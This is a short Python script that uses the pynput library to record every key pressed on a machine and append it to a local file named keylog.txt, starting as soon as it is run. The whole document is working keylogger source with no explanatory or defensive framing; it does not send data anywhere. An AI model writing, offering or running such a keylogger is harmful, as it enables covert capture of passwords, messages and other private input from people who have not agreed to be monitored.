
from pynput.keyboard import Listener

def log_keystrokes(log_file="keylog.txt"):
    def on_press(key):
        with open(log_file, "a") as file:
            file.write(f"{key} ")

    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    log_keystrokes()
    